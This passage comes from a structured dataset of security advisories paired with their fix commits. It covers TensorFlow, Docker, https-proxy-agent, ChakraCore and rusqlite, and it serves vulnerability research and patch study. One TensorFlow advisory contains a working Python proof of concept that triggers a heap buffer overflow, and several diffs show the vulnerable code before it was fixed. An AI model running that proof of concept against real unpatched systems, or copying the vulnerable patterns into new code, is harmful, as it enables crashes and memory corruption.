2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6c40f0c6cbf00d46c7717a26419f2062f2f8694","commit_sha":"f6c40f0c6cbf00d46c7717a26419f2062f2f8694","patch":"SINGLE","chain_ord":"['f6c40f0c6cbf00d46c7717a26419f2062f2f8694']","before_first_fix_commit":"{'50711818d2e61ccce012591eeb4fdf93a8496726'}","last_fix_commit":"f6c40f0c6cbf00d46c7717a26419f2062f2f8694","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2021, 00:00:39","message":"Validate min and max arguments to `QuantizedResizeBilinear`.\n\nPiperOrigin-RevId: 369765091\nChange-Id: I33be8b78273ab7d08b97541692fe05cb7f94963a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 8, 'deletions': 2, 'total': 10}","files":"{'tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc': {'additions': 8, 'deletions': 2, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f6c40f0c6cbf00d46c7717a26419f2062f2f8694\/tensorflow%2Fcore%2Fkernels%2Fquantized_resize_bilinear_op.cc', 'patch': '@@ -702,8 +702,14 @@ class QuantizedResizeBilinearOp : public OpKernel {\\n   }\\n \\n   void Compute(OpKernelContext* context) override {\\n-    const float in_min = context->input(2).flat<float>()(0);\\n-    const float in_max = context->input(3).flat<float>()(0);\\n+    const auto& in_min_tensor = context->input(2);\\n+    OP_REQUIRES(context, TensorShapeUtils::IsScalar(in_min_tensor.shape()),\\n+                errors::InvalidArgument(\"min must be a scalar\"));\\n+    const float in_min = in_min_tensor.flat<float>()(0);\\n+    const auto& in_max_tensor = context->input(3);\\n+    OP_REQUIRES(context, TensorShapeUtils::IsScalar(in_max_tensor.shape()),\\n+                errors::InvalidArgument(\"max must be a scalar\"));\\n+    const float in_max = in_max_tensor.flat<float>()(0);\\n \\n     ImageResizerState st(align_corners_, false);\\n     st.ValidateAndCreateOutput(context);'}}","message_norm":"validate min and max arguments to `quantizedresizebilinear`.\n\npiperorigin-revid: 369765091\nchange-id: i33be8b78273ab7d08b97541692fe05cb7f94963a","language":"en","entities":"[('validate', 'ACTION', ''), ('369765091', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc'])","num_files":1.0},{"index":1197,"vuln_id":"GHSA-8cxv-76p7-jxwr","cwe_id":"{'CWE-476'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250'}","dataset":"osv","summary":"Null-dereference in Tensorflow ### Impact\nThe [implementation of `GetInitOp`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/cc\/saved_model\/loader_util.cc#L31-L61) is vulnerable to a crash caused by dereferencing a null pointer:\n\n```cc\nconst auto& init_op_sig_it =\n    meta_graph_def.signature_def().find(kSavedModelInitOpSignatureKey);\nif (init_op_sig_it != sig_def_map.end()) {\n  *init_op_name = init_op_sig_it->second.outputs()\n                      .find(kSavedModelInitOpSignatureKey)\n                      ->second.name();\n  return Status::OK();\n}\n```\n\nHere, we have a nested map and we assume that if the first `.find` succeeds then so would be the search in the internal map. However, the maps are built based on the `SavedModel` protobuf format and a malicious user can alter that on disk before loading to cause the second `.find` to return `nullptr`.\n### Patches\nWe have patched the issue in GitHub commit [4f38b1ac8e42727e18a2f0bde06d3bee8e77b250](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250","commit_sha":"4f38b1ac8e42727e18a2f0bde06d3bee8e77b250","patch":"SINGLE","chain_ord":"['4f38b1ac8e42727e18a2f0bde06d3bee8e77b250']","before_first_fix_commit":"{'7b84b7c651dc2ecc1e28f2acc65bfe371a04ecfc'}","last_fix_commit":"4f38b1ac8e42727e18a2f0bde06d3bee8e77b250","chain_ord_pos":1.0,"commit_datetime":"11\/10\/2021, 00:56:28","message":"Prevent null dereference read in `GetInitOp`.\n\nWe have a map of maps. We test that the key exists in the first map but then we don't have any validation that this also means the second map has the needed key. In the scenarios where this is not the case, we'll dereference a nullptr, if we don't have this check\n\nPiperOrigin-RevId: 408739325\nChange-Id: If9bb7ed759aba1f3b56a34913f209508dbaf65ce","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 8, 'deletions': 3, 'total': 11}","files":"{'tensorflow\/cc\/saved_model\/loader_util.cc': {'additions': 8, 'deletions': 3, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250\/tensorflow%2Fcc%2Fsaved_model%2Floader_util.cc', 'patch': '@@ -34,9 +34,14 @@ Status GetInitOp(const string& export_dir, const MetaGraphDef& meta_graph_def,\\n   const auto& init_op_sig_it =\\n       meta_graph_def.signature_def().find(kSavedModelInitOpSignatureKey);\\n   if (init_op_sig_it != sig_def_map.end()) {\\n-    *init_op_name = init_op_sig_it->second.outputs()\\n-                        .find(kSavedModelInitOpSignatureKey)\\n-                        ->second.name();\\n+    const auto& sig_def_outputs = init_op_sig_it->second.outputs();\\n+    const auto& sig_def_outputs_it =\\n+        sig_def_outputs.find(kSavedModelInitOpSignatureKey);\\n+    if (sig_def_outputs_it == sig_def_outputs.end()) {\\n+      return errors::FailedPrecondition(\"Could not find output \",\\n+                                        kSavedModelInitOpSignatureKey);\\n+    }\\n+    *init_op_name = sig_def_outputs_it->second.name();\\n     return Status::OK();\\n   }'}}","message_norm":"prevent null dereference read in `getinitop`.\n\nwe have a map of maps. we test that the key exists in the first map but then we don't have any validation that this also means the second map has the needed key. in the scenarios where this is not the case, we'll dereference a nullptr, if we don't have this check\n\npiperorigin-revid: 408739325\nchange-id: if9bb7ed759aba1f3b56a34913f209508dbaf65ce","language":"en","entities":"[('prevent', 'ACTION', ''), ('null dereference', 'SECWORD', ''), ('key', 'SECWORD', ''), ('key', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('408739325', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/cc\/saved_model\/loader_util.cc'])","num_files":1.0},{"index":1204,"vuln_id":"GHSA-8fvr-5rqf-3wwh","cwe_id":"{'CWE-285'}","score":8.4,"chain":"{'https:\/\/github.com\/moby\/moby\/commit\/545b440a80f676a506e5837678dd4c4f65e78660'}","dataset":"osv","summary":"Information Exposure in Docker Engine Docker Engine before 1.6.1 uses weak permissions for (1) \/proc\/asound, (2) \/proc\/timer_stats, (3) \/proc\/latency_stats, and (4) \/proc\/fs, which allows local users to modify the host, obtain sensitive information, and perform protocol downgrade attacks via a crafted image.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/moby\/moby","commit_href":"https:\/\/github.com\/moby\/moby\/commit\/545b440a80f676a506e5837678dd4c4f65e78660","commit_sha":"545b440a80f676a506e5837678dd4c4f65e78660","patch":"SINGLE","chain_ord":"['545b440a80f676a506e5837678dd4c4f65e78660']","before_first_fix_commit":"{'3162024e28c401750388da3417a44a552c6d5011'}","last_fix_commit":"545b440a80f676a506e5837678dd4c4f65e78660","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2015, 20:33:51","message":"Mount \/proc\/fs as readonly\n\nSigned-off-by: Michael Crosby <crosbymichael@gmail.com>","author":"Michael Crosby","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'daemon\/execdriver\/native\/template\/default_template.go': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moby\/moby\/raw\/545b440a80f676a506e5837678dd4c4f65e78660\/daemon%2Fexecdriver%2Fnative%2Ftemplate%2Fdefault_template.go', 'patch': '@@ -86,6 +86,7 @@ func New() *configs.Config {\\n \\t\\tReadonlyPaths: []string{\\n \\t\\t\\t\"\/proc\/asound\",\\n \\t\\t\\t\"\/proc\/bus\",\\n+\\t\\t\\t\"\/proc\/fs\",\\n \\t\\t\\t\"\/proc\/irq\",\\n \\t\\t\\t\"\/proc\/sys\",\\n \\t\\t\\t\"\/proc\/sysrq-trigger\",'}}","message_norm":"mount \/proc\/fs as readonly\n\nsigned-off-by: michael crosby <crosbymichael@gmail.com>","language":"en","entities":"[('crosbymichael@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['daemon\/execdriver\/native\/template\/default_template.go'])","num_files":1.0},{"index":1207,"vuln_id":"GHSA-8g7p-74h8-hg48","cwe_id":"{'CWE-400', 'CWE-125'}","score":9.1,"chain":"{'https:\/\/github.com\/TooTallNate\/node-https-proxy-agent\/commit\/1c24219df87524e6ed973127e81f30801d658f07'}","dataset":"osv","summary":"Denial of Service in https-proxy-agent Versions of `https-proxy-agent` before 2.2.0 are vulnerable to denial of service. This is due to unsanitized options (proxy.auth) being passed to `Buffer()`.\n\n\n## Recommendation\n\nUpdate to version 2.2.0 or later.","published_date":"2018-07-27","chain_len":1,"project":"https:\/\/github.com\/TooTallNate\/node-https-proxy-agent","commit_href":"https:\/\/github.com\/TooTallNate\/node-https-proxy-agent\/commit\/1c24219df87524e6ed973127e81f30801d658f07","commit_sha":"1c24219df87524e6ed973127e81f30801d658f07","patch":"SINGLE","chain_ord":"['1c24219df87524e6ed973127e81f30801d658f07']","before_first_fix_commit":"{'c58d365dd153104d1147967a0a6b4e1dd1698e50'}","last_fix_commit":"1c24219df87524e6ed973127e81f30801d658f07","chain_ord_pos":1.0,"commit_datetime":"03\/03\/2018, 19:31:04","message":"Use `Buffer.from()`\n\n`new Buffer()` is deprecated and unsafe.","author":"Nathan Rajlich","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TooTallNate\/node-https-proxy-agent\/raw\/1c24219df87524e6ed973127e81f30801d658f07\/index.js', 'patch': \"@@ -204,7 +204,7 @@ HttpsProxyAgent.prototype.callback = function connect(req, opts, fn) {\\n   var headers = Object.assign({}, proxy.headers);\\n   if (proxy.auth) {\\n     headers['Proxy-Authorization'] =\\n-      'Basic ' + new Buffer(proxy.auth).toString('base64');\\n+      'Basic ' + Buffer.from(proxy.auth).toString('base64');\\n   }\\n \\n   \/\/ the Host header should only include the port\"}}","message_norm":"use `buffer.from()`\n\n`new buffer()` is deprecated and unsafe.","language":"en","entities":"[('unsafe', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1210,"vuln_id":"GHSA-8gv3-57p6-g35r","cwe_id":"{'CWE-787', 'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a84358aa12f0b1518e606095ab9cfddbf597c121'}","dataset":"osv","summary":"Heap buffer overflow in `RaggedTensorToTensor` ### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor`:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([10, 10], shape=[2], dtype=tf.int64)\nvalues = tf.constant(0, shape=[1], dtype=tf.int64)\ndefault_value = tf.constant(0, dtype=tf.int64)\nl = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nrow = tf.constant(l, shape=[5, 43], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n    shape=shape, values=values, default_value=default_value,\n    row_partition_tensors=rows, row_partition_types=types) \n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/d94227d43aa125ad8b54115c03cece54f6a1977b\/tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc#L219-L222) uses the same index to access two arrays in parallel:\n\n```cc\nfor (INDEX_TYPE i = 0; i < row_split_size - 1; ++i) {\n  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);\n  INDEX_TYPE real_length = std::min(output_size, row_length);\n  INDEX_TYPE parent_output_index_current = parent_output_index[i];\n  ...\n}\n```\n\nSince the user controls the shape of the input arguments, an attacker could trigger a heap OOB access when `parent_output_index` is shorter than `row_split`.\n\n### Patches\nWe have patched the issue in GitHub commit [a84358aa12f0b1518e606095ab9cfddbf597c121](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a84358aa12f0b1518e606095ab9cfddbf597c121).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a84358aa12f0b1518e606095ab9cfddbf597c121","commit_sha":"a84358aa12f0b1518e606095ab9cfddbf597c121","patch":"SINGLE","chain_ord":"['a84358aa12f0b1518e606095ab9cfddbf597c121']","before_first_fix_commit":"{'d94227d43aa125ad8b54115c03cece54f6a1977b'}","last_fix_commit":"a84358aa12f0b1518e606095ab9cfddbf597c121","chain_ord_pos":1.0,"commit_datetime":"05\/04\/2021, 20:45:57","message":"Fix heap-buffer-overflow issue with `tf.raw_ops.RaggedTensorToTensor`.\n\nPiperOrigin-RevId: 371986929\nChange-Id: I79ab962a22c5867f36f7f45b780a1ac881b1dbdd","author":"Amit Patankar","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a84358aa12f0b1518e606095ab9cfddbf597c121\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_tensor_op.cc', 'patch': '@@ -313,6 +313,12 @@ class RaggedTensorToTensorBaseOp : public OpKernel {\\n             output_index_multiplier, output_size, result);\\n         return tensorflow::Status::OK();\\n       case RowPartitionType::ROW_SPLITS:\\n+        if (row_partition_tensor.size() - 1 > parent_output_index.size()) {\\n+          return errors::InvalidArgument(\\n+              \"Row partition size is greater than output size: \",\\n+              row_partition_tensor.size() - 1, \" > \",\\n+              parent_output_index.size());\\n+        }\\n         CalculateOutputIndexRowSplit(\\n             context, row_partition_tensor, parent_output_index,\\n             output_index_multiplier, output_size, result);'}}","message_norm":"fix heap-buffer-overflow issue with `tf.raw_ops.raggedtensortotensor`.\n\npiperorigin-revid: 371986929\nchange-id: i79ab962a22c5867f36f7f45b780a1ac881b1dbdd","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('371986929', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_tensor_op.cc'])","num_files":1.0},{"index":1212,"vuln_id":"GHSA-8gvg-8vhf-h26g","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/d797e3f00e34c12c8c0ae52f56344325439dccd7', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7827e117753052d479fabe19a25cfece88059bca'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0912, CVE-2019-0913, CVE-2019-0914, CVE-2019-0915, CVE-2019-0916, CVE-2019-0917, CVE-2019-0922, CVE-2019-0923, CVE-2019-0924, CVE-2019-0925, CVE-2019-0927, CVE-2019-0933.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7827e117753052d479fabe19a25cfece88059bca","commit_sha":"7827e117753052d479fabe19a25cfece88059bca","patch":"MULTI","chain_ord":"['7827e117753052d479fabe19a25cfece88059bca', 'd797e3f00e34c12c8c0ae52f56344325439dccd7']","before_first_fix_commit":"{'ea0491305137183603bf43844b5584d4cc972e28', '4594e340bc9ca9f857010a68e8b562d65b46eed6'}","last_fix_commit":"d797e3f00e34c12c8c0ae52f56344325439dccd7","chain_ord_pos":1.0,"commit_datetime":"04\/17\/2019, 22:42:35","message":"[CVE-2019-0937]","author":"Paul Leathers","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'lib\/Runtime\/ByteCode\/ByteCodeEmitter.cpp': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/7827e117753052d479fabe19a25cfece88059bca\/lib%2FRuntime%2FByteCode%2FByteCodeEmitter.cpp', 'patch': '@@ -4006,6 +4006,11 @@ void ByteCodeGenerator::StartEmitCatch(ParseNodeCatch *pnodeCatch)\\n                 sym->SetIsGlobalCatch(true);\\n             }\\n \\n+            if (sym->NeedsScopeObject())\\n+            {\\n+                scope->SetIsObject();\\n+            }\\n+\\n             Assert(sym->GetScopeSlot() == Js::Constants::NoProperty);\\n             if (sym->NeedsSlotAlloc(this, funcInfo))\\n             {\\n@@ -4029,6 +4034,11 @@ void ByteCodeGenerator::StartEmitCatch(ParseNodeCatch *pnodeCatch)\\n             sym->SetIsGlobalCatch(true);\\n         }\\n \\n+        if (sym->NeedsScopeObject())\\n+        {\\n+            scope->SetIsObject();\\n+        }\\n+\\n         if (scope->GetMustInstantiate())\\n         {\\n             if (sym->IsInSlot(this, funcInfo))'}}","message_norm":"[cve-2019-0937]","language":"ro","entities":"[('cve-2019-0937', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Runtime\/ByteCode\/ByteCodeEmitter.cpp'])","num_files":1.0},{"index":1216,"vuln_id":"GHSA-8h4j-vm3r-vcq3","cwe_id":"{'CWE-416'}","score":9.8,"chain":"{'https:\/\/github.com\/rusqlite\/rusqlite\/commit\/2ef3628dac35aeba0a97d5fb3a57746b4e1d62b3'}","dataset":"osv","summary":"Use after free in rusqlite An issue was discovered in the rusqlite crate before 0.23.0 for Rust. Memory safety can be violated via an Auxdata API use-after-free.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/rusqlite\/rusqlite","commit_href":"https:\/\/github.com\/rusqlite\/rusqlite\/commit\/2ef3628dac35aeba0a97d5fb3a57746b4e1d62b3","commit_sha":"2ef3628dac35aeba0a97d5fb3a57746b4e1d62b3","patch":"SINGLE","chain_ord":"['2ef3628dac35aeba0a97d5fb3a57746b4e1d62b3']","before_first_fix_commit":"{'71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0'}","last_fix_commit":"2ef3628dac35aeba0a97d5fb3a57746b4e1d62b3","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2020, 02:41:01","message":"Actually fix auxdata api...","author":"Thom Chiovoloni","comments":null,"stats":"{'additions': 54, 'deletions': 65, 'total': 119}","files":"{'src\/functions.rs': {'additions': 54, 'deletions': 65, 'changes': 119, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rusqlite\/rusqlite\/raw\/2ef3628dac35aeba0a97d5fb3a57746b4e1d62b3\/src%2Ffunctions.rs', 'patch': '@@ -12,6 +12,8 @@\\n \/\/! use regex::Regex;\\n \/\/! use rusqlite::functions::FunctionFlags;\\n \/\/! use rusqlite::{Connection, Error, Result, NO_PARAMS};\\n+\/\/! use std::sync::Arc;\\n+\/\/! type BoxError = Box<dyn std::error::Error + Send + Sync + \\'static>;\\n \/\/!\\n \/\/! fn add_regexp_function(db: &Connection) -> Result<()> {\\n \/\/!     db.create_scalar_function(\\n@@ -20,34 +22,19 @@\\n \/\/!         FunctionFlags::SQLITE_UTF8 | FunctionFlags::SQLITE_DETERMINISTIC,\\n \/\/!         move |ctx| {\\n \/\/!             assert_eq!(ctx.len(), 2, \"called with unexpected number of arguments\");\\n-\/\/!\\n-\/\/!             let saved_re: Option<&Regex> = ctx.get_aux(0)?;\\n-\/\/!             let new_re = match saved_re {\\n-\/\/!                 None => {\\n-\/\/!                     let s = ctx.get::<String>(0)?;\\n-\/\/!                     match Regex::new(&s) {\\n-\/\/!                         Ok(r) => Some(r),\\n-\/\/!                         Err(err) => return Err(Error::UserFunctionError(Box::new(err))),\\n-\/\/!                     }\\n-\/\/!                 }\\n-\/\/!                 Some(_) => None,\\n-\/\/!             };\\n-\/\/!\\n+\/\/!             let regexp: Arc<Regex> = ctx\\n+\/\/!                 .get_or_create_aux(0, |vr| -> Result<_, BoxError> {\\n+\/\/!                     Ok(Regex::new(vr.as_str()?)?)\\n+\/\/!                 })?;\\n \/\/!             let is_match = {\\n-\/\/!                 let re = saved_re.unwrap_or_else(|| new_re.as_ref().unwrap());\\n-\/\/!\\n \/\/!                 let text = ctx\\n \/\/!                     .get_raw(1)\\n \/\/!                     .as_str()\\n \/\/!                     .map_err(|e| Error::UserFunctionError(e.into()))?;\\n \/\/!\\n-\/\/!                 re.is_match(text)\\n+\/\/!                 regexp.is_match(text)\\n \/\/!             };\\n \/\/!\\n-\/\/!             if let Some(re) = new_re {\\n-\/\/!                 ctx.set_aux(0, re);\\n-\/\/!             }\\n-\/\/!\\n \/\/!             Ok(is_match)\\n \/\/!         },\\n \/\/!     )\\n@@ -67,11 +54,12 @@\\n \/\/!     Ok(())\\n \/\/! }\\n \/\/! ```\\n-use std::any::TypeId;\\n+use std::any::Any;\\n use std::os::raw::{c_int, c_void};\\n use std::panic::{catch_unwind, RefUnwindSafe, UnwindSafe};\\n use std::ptr;\\n use std::slice;\\n+use std::sync::Arc;\\n \\n use crate::ffi;\\n use crate::ffi::sqlite3_context;\\n@@ -121,6 +109,7 @@ unsafe extern \"C\" fn free_boxed_value<T>(p: *mut c_void) {\\n pub struct Context<\\'a> {\\n     ctx: *mut sqlite3_context,\\n     args: &\\'a [*mut sqlite3_value],\\n+    \/\/ conn: PhantomData<&\\'conn mut Connection>,\\n }\\n \\n impl Context<\\'_> {\\n@@ -174,47 +163,60 @@ impl Context<\\'_> {\\n         unsafe { ValueRef::from_value(arg) }\\n     }\\n \\n+    pub fn get_or_create_aux<T, E, F>(&self, arg: c_int, func: F) -> Result<Arc<T>>\\n+    where\\n+        T: Send + Sync + \\'static,\\n+        E: Into<Box<dyn std::error::Error + Send + Sync + \\'static>>,\\n+        F: FnOnce(ValueRef<\\'_>) -> Result<T, E>,\\n+    {\\n+        if let Some(v) = self.get_aux(arg)? {\\n+            Ok(v)\\n+        } else {\\n+            let vr = self.get_raw(arg as usize);\\n+            self.set_aux(\\n+                arg,\\n+                func(vr).map_err(|e| Error::UserFunctionError(e.into()))?,\\n+            )\\n+        }\\n+    }\\n+\\n     \/\/\/ Sets the auxilliary data associated with a particular parameter. See\\n     \/\/\/ https:\/\/www.sqlite.org\/c3ref\/get_auxdata.html for a discussion of\\n     \/\/\/ this feature, or the unit tests of this module for an example.\\n-    pub fn set_aux<T: \\'static>(&self, arg: c_int, value: T) {\\n-        let boxed = Box::into_raw(Box::new(AuxData {\\n-            id: TypeId::of::<T>(),\\n-            value,\\n-        }));\\n+    pub fn set_aux<T: Send + Sync + \\'static>(&self, arg: c_int, value: T) -> Result<Arc<T>> {\\n+        let orig: Arc<T> = Arc::new(value);\\n+        let inner: AuxInner = orig.clone();\\n+        let outer = Box::new(inner);\\n+        let raw: *mut AuxInner = Box::into_raw(outer);\\n         unsafe {\\n             ffi::sqlite3_set_auxdata(\\n                 self.ctx,\\n                 arg,\\n-                boxed as *mut c_void,\\n-                Some(free_boxed_value::<AuxData<T>>),\\n+                raw as *mut _,\\n+                Some(free_boxed_value::<AuxInner>),\\n             )\\n         };\\n+        Ok(orig)\\n     }\\n \\n-    \/\/\/ Gets the auxilliary data that was associated with a given parameter\\n-    \/\/\/ via `set_aux`. Returns `Ok(None)` if no data has been associated,\\n-    \/\/\/ and .\\n-    pub fn get_aux<T: \\'static>(&self, arg: c_int) -> Result<Option<&T>> {\\n-        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *const AuxData<T> };\\n+    \/\/\/ Gets the auxilliary data that was associated with a given parameter via\\n+    \/\/\/ `set_aux`. Returns `Ok(None)` if no data has been associated, and\\n+    \/\/\/ Ok(Some(v)) if it has. Returns an error if the requested type does not\\n+    \/\/\/ match.\\n+    pub fn get_aux<T: Send + Sync + \\'static>(&self, arg: c_int) -> Result<Option<Arc<T>>> {\\n+        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *const AuxInner };\\n         if p.is_null() {\\n             Ok(None)\\n         } else {\\n-            let id = unsafe { (*p).id };\\n-            if TypeId::of::<T>() != id {\\n-                Err(Error::GetAuxWrongType)\\n-            } else {\\n-                Ok(Some(unsafe { &(*p).value }))\\n-            }\\n+            let v: AuxInner = AuxInner::clone(unsafe { &*p });\\n+            v.downcast::<T>()\\n+                .map(Some)\\n+                .map_err(|_| Error::GetAuxWrongType)\\n         }\\n     }\\n }\\n \\n-#[repr(C)]\\n-struct AuxData<T: \\'static> {\\n-    id: TypeId,\\n-    value: T,\\n-}\\n+type AuxInner = Arc<dyn Any + Send + Sync + \\'static>;\\n \\n \/\/\/ `feature = \"functions\"` Aggregate is the callback interface for user-defined\\n \/\/\/ aggregate function.\\n@@ -776,34 +778,21 @@ mod test {\\n     \/\/ expression multiple times within one query.\\n     fn regexp_with_auxilliary(ctx: &Context<\\'_>) -> Result<bool> {\\n         assert_eq!(ctx.len(), 2, \"called with unexpected number of arguments\");\\n-\\n-        let saved_re: Option<&Regex> = ctx.get_aux(0)?;\\n-        let new_re = match saved_re {\\n-            None => {\\n-                let s = ctx.get::<String>(0)?;\\n-                match Regex::new(&s) {\\n-                    Ok(r) => Some(r),\\n-                    Err(err) => return Err(Error::UserFunctionError(Box::new(err))),\\n-                }\\n-            }\\n-            Some(_) => None,\\n-        };\\n+        type BoxError = Box<dyn std::error::Error + Send + Sync + \\'static>;\\n+        let regexp: std::sync::Arc<Regex> = ctx\\n+            .get_or_create_aux(0, |vr| -> Result<_, BoxError> {\\n+                Ok(Regex::new(vr.as_str()?)?)\\n+            })?;\\n \\n         let is_match = {\\n-            let re = saved_re.unwrap_or_else(|| new_re.as_ref().unwrap());\\n-\\n             let text = ctx\\n                 .get_raw(1)\\n                 .as_str()\\n                 .map_err(|e| Error::UserFunctionError(e.into()))?;\\n \\n-            re.is_match(text)\\n+            regexp.is_match(text)\\n         };\\n \\n-        if let Some(re) = new_re {\\n-            ctx.set_aux(0, re);\\n-        }\\n-\\n         Ok(is_match)\\n     }\\n \\n@@ -878,10 +867,10 @@ mod test {\\n         let db = Connection::open_in_memory().unwrap();\\n         db.create_scalar_function(\"example\", 2, FunctionFlags::default(), |ctx| {\\n             if !ctx.get::<bool>(1)? {\\n-                ctx.set_aux::<i64>(0, 100);\\n+                ctx.set_aux::<i64>(0, 100)?;\\n             } else {\\n                 assert_eq!(ctx.get_aux::<String>(0), Err(Error::GetAuxWrongType));\\n-                